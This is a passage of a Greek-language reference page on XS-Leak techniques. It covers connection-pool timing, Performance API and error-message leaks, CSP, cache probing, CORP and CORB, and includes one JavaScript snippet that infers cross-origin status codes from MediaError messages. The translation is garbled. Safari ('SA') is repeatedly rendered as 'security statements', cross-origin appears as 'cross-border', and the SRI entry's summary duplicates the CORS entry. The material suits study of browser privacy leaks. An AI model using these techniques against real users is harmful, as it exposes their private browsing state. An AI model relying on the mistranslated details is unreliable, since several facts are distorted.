4. Προσπαθήστε να κάνετε μια 257η αίτηση σε διαφορετικό διακομιστή. Δεδομένου ότι όλοι οι υποδοχείς είναι σε χρήση (όπως αναφέρεται στα βήματα 2 και 3), αυτή η αίτηση θα είναι σε αναμονή μέχρι να γίνει διαθέσιμος ένας υποδοχέας. Η καθυστέρηση πριν από αυτή την αίτηση προχωρήσει παρέχει στον επιτιθέμενο πληροφορίες χρονομέτρησης σχετικά με τη δικτυακή δραστηριότητα που σχετίζεται με τον 256ο υποδοχέα (τον υποδοχέα της στοχευμένης σελίδας). Αυτή η συμπερασματική είναι δυνατή επειδή οι 255 υποδοχείς από το βήμα 2 είναι ακόμα απασχολημένοι, υποδηλώνοντας ότι οποιοσδήποτε νέος διαθέσιμος υποδοχέας πρέπει να είναι αυτός που απελευθερώθηκε από το βήμα 3. Ο χρόνος που χρειάζεται για να γίνει διαθέσιμος ο 256ος υποδοχέας συνδέεται άμεσα με τον χρόνο που απαιτείται για να ολοκληρωθεί η αίτηση στη στοχευμένη σελίδα.

Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**:
- **Summary:** Είναι όπως η προηγούμενη τεχνική αλλά αντί να χρησιμοποιεί όλους τους υποδοχείς, το Google **Chrome** θέτει ένα όριο **6 ταυτόχρονων αιτήσεων στην ίδια προέλευση**. Αν **μπλοκάρουμε 5** και στη συνέχεια **εκκινήσουμε μια 6η** αίτηση μπορούμε να **χρονομετρήσουμε** την και αν καταφέραμε να κάνουμε τη **σελίδα του θύματος να στείλει** περισσότερες **αιτήσεις** στο ίδιο endpoint για να ανιχνεύσουμε μια **κατάσταση** της **σελίδας**, η **6η αίτηση** θα χρειαστεί **περισσότερο** χρόνο και μπορούμε να το ανιχνεύσουμε.

## Performance API Techniques

Το [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει πληροφορίες σχετικά με τις μετρικές απόδοσης των διαδικτυακών εφαρμογών, εμπλουτισμένο περαιτέρω από το [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Το Resource Timing API επιτρέπει την παρακολούθηση λεπτομερών χρονομετρήσεων αιτήσεων δικτύου, όπως η διάρκεια των αιτήσεων. Σημαντικά, όταν οι διακομιστές περιλαμβάνουν την κεφαλίδα `Timing-Allow-Origin: *` στις απαντήσεις τους, επιπλέον δεδομένα όπως το μέγεθος μεταφοράς και ο χρόνος αναζήτησης τομέα γίνονται διαθέσιμα.

Αυτή η πλούσια συλλογή δεδομένων μπορεί να ανακτηθεί μέσω μεθόδων όπως [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ή [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), παρέχοντας μια ολοκληρωμένη εικόνα των πληροφοριών που σχετίζονται με την απόδοση. Επιπλέον, το API διευκολύνει τη μέτρηση χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ χρονοσημάνσεων που αποκτώνται από [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε περιηγητές όπως το Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται σε χιλιοστά του δευτερολέπτου, γεγονός που μπορεί να επηρεάσει την λεπτομέρεια των μετρήσεων χρόνου.

Πέρα από τις μετρήσεις χρόνου, το Performance API μπορεί να αξιοποιηθεί για πληροφορίες σχετικές με την ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στο Chrome μπορεί να υποδηλώνει την εφαρμογή του `X-Frame-Options`. Συγκεκριμένα, αν μια σελίδα αποκλείεται από την απόδοση σε ένα πλαίσιο λόγω του `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας μια λεπτή ένδειξη σχετικά με τις πολιτικές πλαισίωσης της σελίδας.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Μια αίτηση που έχει ως αποτέλεσμα σφάλματα δεν θα δημιουργήσει μια είσοδο χρονομέτρησης πόρων.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Είναι δυνατόν να **διακρίνετε μεταξύ των κωδικών κατάστασης HTTP** επειδή οι αιτήσεις που οδηγούν σε **σφάλμα** δεν **δημιουργούν μια είσοδο απόδοσης**.

### Style Reload Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Λόγω ενός σφάλματος του περιηγητή, οι αιτήσεις που οδηγούν σε σφάλματα φορτώνονται δύο φορές.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Στην προηγούμενη τεχνική εντοπίστηκαν επίσης δύο περιπτώσεις όπου σφάλματα του περιηγητή στο GC οδηγούν σε **πόρους που φορτώνονται δύο φορές όταν αποτυγχάνουν να φορτωθούν**. Αυτό θα έχει ως αποτέλεσμα πολλαπλές εισόδους στο Performance API και μπορεί έτσι να ανιχνευθεί.

### Request Merging Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Αιτήσεις που οδηγούν σε σφάλμα δεν μπορούν να συγχωνευθούν.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Η τεχνική βρέθηκε σε έναν πίνακα στο αναφερόμενο έγγραφο αλλά δεν βρέθηκε περιγραφή της τεχνικής σε αυτό. Ωστόσο, μπορείτε να βρείτε τον πηγαίο κώδικα ελέγχοντας το [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Κενές απαντήσεις δεν δημιουργούν εισόδους χρονομέτρησης πόρων.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ένας επιτιθέμενος μπορεί να ανιχνεύσει αν μια αίτηση είχε ως αποτέλεσμα ένα κενό σώμα HTTP επειδή οι **κενές σελίδες δεν δημιουργούν μια είσοδο απόδοσης σε ορισμένους περιηγητές**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Χρησιμοποιώντας τον XSS Auditor στις Ασφαλιστικές Δηλώσεις, οι επιτιθέμενοι μπορούν να ανιχνεύσουν συγκεκριμένα στοιχεία ιστοσελίδας παρατηρώντας τις αλλαγές στις απαντήσεις όταν οι κατασκευασμένες payloads ενεργοποιούν τον μηχανισμό φιλτραρίσματος του auditor.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Στις Ασφαλιστικές Δηλώσεις (SA), ο XSS Auditor, αρχικά προορισμένος να αποτρέπει επιθέσεις Cross-Site Scripting (XSS), μπορεί παραδόξως να εκμεταλλευτεί για να διαρρεύσει ευαίσθητες πληροφορίες. Αν και αυτή η ενσωματωμένη δυνατότητα αφαιρέθηκε από το Google Chrome (GC), εξακολουθεί να είναι παρούσα στο SA. Το 2013, οι Braun και Heiderich απέδειξαν ότι ο XSS Auditor θα μπορούσε κατά λάθος να αποκλείσει νόμιμα σενάρια, οδηγώντας σε ψευδώς θετικά. Βασισμένοι σε αυτό, οι ερευνητές ανέπτυξαν τεχνικές για την εξαγωγή πληροφοριών και την ανίχνευση συγκεκριμένου περιεχομένου σε σελίδες από άλλες προελεύσεις, μια έννοια γνωστή ως XS-Leaks, που αναφέρθηκε αρχικά από τον Terada και αναλύθηκε από τον Heyes σε μια ανάρτηση blog. Αν και αυτές οι τεχνικές ήταν συγκεκριμένες για τον XSS Auditor στο GC, ανακαλύφθηκε ότι στο SA, οι σελίδες που αποκλείονται από τον XSS Auditor δεν δημιουργούν εισόδους στο Performance API, αποκαλύπτοντας μια μέθοδο μέσω της οποίας μπορεί να διαρρεύσει ευαίσθητη πληροφορία.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** Πόρος με κεφαλίδα X-Frame-Options δεν δημιουργεί είσοδο χρονομέτρησης πόρων.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Αν μια σελίδα **δεν επιτρέπεται** να **απεικονίζεται** σε ένα **iframe** δεν δημιουργεί **είσοδο απόδοσης**. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να ανιχνεύσει την κεφαλίδα απάντησης **`X-Frame-Options`**.\
Το ίδιο συμβαίνει αν χρησιμοποιήσετε μια **embed** **tag.**

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Οι λήψεις δεν δημιουργούν εισόδους χρονομέτρησης πόρων στο Performance API.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Παρόμοια, με την XS-Leak που περιγράφηκε, ένας **πόρος που κατεβάζεται** λόγω της κεφαλίδας ContentDisposition, επίσης δεν **δημιουργεί μια είσοδο απόδοσης**. Αυτή η τεχνική λειτουργεί σε όλους τους κύριους περιηγητές.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Η είσοδος χρονομέτρησης πόρων διαρρέει τον χρόνο έναρξης μιας ανακατεύθυνσης.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε μια περίπτωση XS-Leak που εκμεταλλεύεται τη συμπεριφορά ορισμένων περιηγητών που καταγράφουν υπερβολικές πληροφορίες για διασυνοριακές αιτήσεις. Το πρότυπο ορίζει ένα υποσύνολο χαρακτηριστικών που θα πρέπει να ρυθμιστούν σε μηδέν για διασυνοριακούς πόρους. Ωστόσο, στο **SA** είναι δυνατόν να ανιχνεύσετε αν ο χρήστης **ανακατευθύνεται** από τη στοχευμένη σελίδα, ερωτώντας το **Performance API** και ελέγχοντας τα δεδομένα χρονομέτρησης **redirectStart**.

### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Η διάρκεια των εισόδων χρονομέτρησης είναι αρνητική όταν συμβαίνει μια ανακατεύθυνση.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Στο GC, η **διάρκεια** για αιτήσεις που οδηγούν σε μια **ανακατεύθυνση** είναι **αρνητική** και μπορεί έτσι να **διακριθεί** από αιτήσεις που δεν οδηγούν σε ανακατεύθυνση.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Πόρος προστατευμένος με CORP δεν δημιουργεί εισόδους χρονομέτρησης πόρων.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η **nextHopProtocol entry** μπορεί να χρησιμοποιηθεί ως τεχνική διαρροής. Στο GC, όταν η **κεφαλίδα CORP** είναι ρυθμισμένη, το nextHopProtocol θα είναι **κενό**. Σημειώστε ότι το SA δεν θα δημιουργήσει καθόλου μια είσοδο απόδοσης για πόρους που έχουν ενεργοποιηθεί με CORP.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: API Usage
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Ανίχνευση αν ένας service worker είναι καταχωρημένος για μια συγκεκριμένη προέλευση.
- **Code Example**:

Οι service workers είναι σενάρια που εκτελούνται σε ένα προορισμό. Εκτελούνται στο παρασκήνιο μιας ιστοσελίδας και μπορούν να παρεμβαίνουν, να τροποποιούν και να **κάνουν cache πόρους** για να δημιουργήσουν διαδικτυακές εφαρμογές εκτός σύνδεσης.\
Αν ένας **πόρος που έχει γίνει cache** από έναν **service worker** προσπελαστεί μέσω **iframe**, ο πόρος θα **φορτωθεί από την cache του service worker**.\
Για να ανιχνεύσετε αν ο πόρος **φορτώθηκε από την cache του service worker**, μπορεί να χρησιμοποιηθεί το **Performance API**.\
Αυτό θα μπορούσε επίσης να γίνει με μια επίθεση χρονομέτρησης (ελέγξτε το έγγραφο για περισσότερες πληροφορίες).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Είναι δυνατόν να ελέγξετε αν ένας πόρος αποθηκεύτηκε στην cache.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Χρησιμοποιώντας το [Performance API](xs-search.md#performance-api) είναι δυνατόν να ελέγξετε αν ένας πόρος είναι αποθηκευμένος στην cache.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** Είναι δυνατόν να ανακτηθεί η διάρκεια δικτύου μιας αίτησης από το `performance` API.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Inclusion Methods**: HTML Elements (Video, Audio)
- **Detectable Difference**: Status Code
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** Στο Firefox είναι δυνατόν να διαρρεύσει με ακρίβεια τον κωδικό κατάστασης μιας διασυνοριακής αίτησης.
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
Η ιδιότητα message της διεπαφής `MediaError` προσδιορίζει μοναδικά τους πόρους που φορτώνονται επιτυχώς με μια διακριτή συμβολοσειρά. Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτή τη δυνατότητα παρατηρώντας το περιεχόμενο του μηνύματος, deducing την κατάσταση απόκρισης ενός πόρου διασυνοριακής προέλευσης.

### CORS Error

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Περίληψη:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθύνσεων.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Αυτή η τεχνική επιτρέπει σε έναν επιτιθέμενο να **εξάγει τον προορισμό μιας ανακατεύθυνσης ιστότοπου διασυνοριακής προέλευσης** εκμεταλλευόμενος το πώς οι περιηγητές βασισμένοι σε Webkit χειρίζονται τα αιτήματα CORS. Συγκεκριμένα, όταν ένα **CORS-enabled request** αποστέλλεται σε έναν στόχο που εκδίδει μια ανακατεύθυνση με βάση την κατάσταση του χρήστη και ο περιηγητής στη συνέχεια απορρίπτει το αίτημα, το **πλήρες URL του στόχου της ανακατεύθυνσης** αποκαλύπτεται μέσα στο μήνυμα σφάλματος. Αυτή η ευπάθεια αποκαλύπτει όχι μόνο το γεγονός της ανακατεύθυνσης αλλά και το σημείο τερματισμού της ανακατεύθυνσης και οποιαδήποτε **ευαίσθητα παραμέτρους ερωτήματος** μπορεί να περιέχει.

### SRI Error

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Περίληψη:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθύνσεων.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί **λεπτομερή μηνύματα σφάλματος** για να deduce το μέγεθος των αποκρίσεων διασυνοριακής προέλευσης. Αυτό είναι δυνατό λόγω του μηχανισμού της Ακεραιότητας Υποπόρων (SRI), ο οποίος χρησιμοποιεί την ιδιότητα ακεραιότητας για να επαληθεύσει ότι οι πόροι που ανακτώνται, συχνά από CDNs, δεν έχουν παραποιηθεί. Για να λειτουργήσει το SRI σε πόρους διασυνοριακής προέλευσης, αυτοί πρέπει να είναι **CORS-enabled**; αλλιώς, δεν υπόκεινται σε ελέγχους ακεραιότητας. Στις Δηλώσεις Ασφαλείας (SA), παρόμοια με το σφάλμα CORS XS-Leak, ένα μήνυμα σφάλματος μπορεί να καταγραφεί μετά από ένα αίτημα fetch με μια ιδιότητα ακεραιότητας που αποτυγχάνει. Οι επιτιθέμενοι μπορούν σκόπιμα να **προκαλέσουν αυτό το σφάλμα** αναθέτοντας μια **ψευδή τιμή hash** στην ιδιότητα ακεραιότητας οποιουδήποτε αιτήματος. Στην SA, το προκύπτον μήνυμα σφάλματος αποκαλύπτει ακούσια το μήκος περιεχομένου του ζητούμενου πόρου. Αυτή η διαρροή πληροφοριών επιτρέπει σε έναν επιτιθέμενο να διακρίνει παραλλαγές στο μέγεθος της απόκρισης, ανοίγοντας το δρόμο για εξελιγμένες επιθέσεις XS-Leak.

### CSP Violation/Detection

- **Μέθοδοι Συμπερίληψης**: Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Περίληψη:** Επιτρέποντας μόνο τον ιστότοπο των θυμάτων στο CSP, αν προσπαθήσουμε να ανακατευθύνουμε σε διαφορετικό τομέα, το CSP θα προκαλέσει ένα ανιχνεύσιμο σφάλμα.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Μια XS-Leak μπορεί να χρησιμοποιήσει το CSP για να ανιχνεύσει αν ένας ιστότοπος διασυνοριακής προέλευσης ανακατευθύνθηκε σε διαφορετική προέλευση. Αυτή η διαρροή μπορεί να ανιχνεύσει την ανακατεύθυνση, αλλά επιπλέον, ο τομέας του στόχου της ανακατεύθυνσης διαρρέει. Η βασική ιδέα αυτής της επίθεσης είναι να **επιτρέψει τον τομέα στόχο στον ιστότοπο του επιτιθέμενου**. Μόλις εκδοθεί ένα αίτημα στον τομέα στόχο, αυτός **ανακατευθύνει** σε έναν διασυνοριακό τομέα. **Το CSP μπλοκάρει** την πρόσβαση σε αυτό και δημιουργεί μια **αναφορά παράβασης που χρησιμοποιείται ως τεχνική διαρροής**. Ανάλογα με τον περιηγητή, **αυτή η αναφορά μπορεί να διαρρεύσει την τοποθεσία στόχου της ανακατεύθυνσης**.\
Οι σύγχρονοι περιηγητές δεν θα υποδείξουν το URL στο οποίο ανακατευθύνθηκε, αλλά μπορείτε να ανιχνεύσετε ότι μια διασυνοριακή ανακατεύθυνση προκλήθηκε.

### Cache

- **Μέθοδοι Συμπερίληψης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Περίληψη:** Καθαρίστε το αρχείο από την κρυφή μνήμη. Ανοίγει τη σελίδα στόχου και ελέγχει αν το αρχείο είναι παρόν στην κρυφή μνήμη.
- **Παράδειγμα Κώδικα:**

Οι περιηγητές μπορεί να χρησιμοποιούν μια κοινή κρυφή μνήμη για όλους τους ιστότοπους. Ανεξάρτητα από την προέλευσή τους, είναι δυνατόν να deduce αν μια σελίδα στόχου έχει **ζητήσει ένα συγκεκριμένο αρχείο**.

Αν μια σελίδα φορτώνει μια εικόνα μόνο αν ο χρήστης είναι συνδεδεμένος, μπορείτε να **ακυρώσετε** τον **πόρο** (έτσι ώστε να μην είναι πλέον αποθηκευμένος στην κρυφή μνήμη αν ήταν, δείτε περισσότερες πληροφορίες), **να εκτελέσετε ένα αίτημα** που θα μπορούσε να φορτώσει αυτόν τον πόρο και να προσπαθήσετε να φορτώσετε τον πόρο **με μια κακή αίτηση** (π.χ. χρησιμοποιώντας έναν υπερβολικά μεγάλο header referer). Αν η φόρτωση του πόρου **δεν προκάλεσε κανένα σφάλμα**, είναι επειδή ήταν **αποθηκευμένος στην κρυφή μνήμη**.

### CSP Directive

- **Μέθοδοι Συμπερίληψης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Περίληψη:** Οι κατευθυντήριες γραμμές του CSP header μπορούν να ερευνηθούν χρησιμοποιώντας την ιδιότητα iframe του CSP, αποκαλύπτοντας λεπτομέρειες πολιτικής.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Μια νέα δυνατότητα στο Google Chrome (GC) επιτρέπει στις ιστοσελίδες να **προτείνουν μια Πολιτική Ασφαλείας Περιεχομένου (CSP)** ορίζοντας μια ιδιότητα σε ένα στοιχείο iframe, με τις κατευθυντήριες γραμμές πολιτικής να μεταδίδονται μαζί με το HTTP αίτημα. Κανονικά, το ενσωματωμένο περιεχόμενο πρέπει να **εξουσιοδοτήσει αυτό μέσω ενός HTTP header**, ή να **εμφανιστεί μια σελίδα σφάλματος**. Ωστόσο, αν το iframe διέπεται ήδη από μια CSP και η νέα προτεινόμενη πολιτική δεν είναι πιο περιοριστική, η σελίδα θα φορτωθεί κανονικά. Αυτός ο μηχανισμός ανοίγει ένα μονοπάτι για έναν επιτιθέμενο να **ανιχνεύσει συγκεκριμένες κατευθυντήριες γραμμές CSP** μιας διασυνοριακής σελίδας αναγνωρίζοντας τη σελίδα σφάλματος. Αν και αυτή η ευπάθεια σημειώθηκε ως διορθωμένη, τα ευρήματά μας αποκαλύπτουν μια **νέα τεχνική διαρροής** ικανή να ανιχνεύσει τη σελίδα σφάλματος, υποδεικνύοντας ότι το υποκείμενο πρόβλημα δεν είχε ποτέ πλήρως αντιμετωπιστεί.

### **CORP**

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Περίληψη:** Οι πόροι που είναι ασφαλισμένοι με την Πολιτική Πόρων Διασυνοριακής Προέλευσης (CORP) θα προκαλέσουν σφάλμα όταν ανακτηθούν από μια μη επιτρεπόμενη προέλευση.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Η κεφαλίδα CORP είναι μια σχετικά νέα δυνατότητα ασφάλειας της διαδικτυακής πλατφόρμας που όταν ρυθμιστεί **μπλοκάρει τις αιτήσεις διασυνοριακής προέλευσης χωρίς CORS για τον δεδομένο πόρο**. Η παρουσία της κεφαλίδας μπορεί να ανιχνευθεί, επειδή ένας πόρος που προστατεύεται με CORP θα **προκαλέσει σφάλμα όταν ανακτηθεί**.

### CORB

- **Μέθοδοι Συμπερίληψης**: HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Headers
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Περίληψη**: Το CORB μπορεί να επιτρέπει στους επιτιθέμενους να ανιχνεύσουν πότε η **κεφαλίδα `nosniff` είναι παρούσα** στο αίτημα.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Ελέγξτε το σύνδεσμο για περισσότερες πληροφορίες σχετικά με την επίθεση.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Headers
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Περίληψη**: Αν η κεφαλίδα Origin ανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, είναι δυνατόν να ελέγξετε αν ένας πόρος είναι ήδη στην κρυφή μνήμη.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

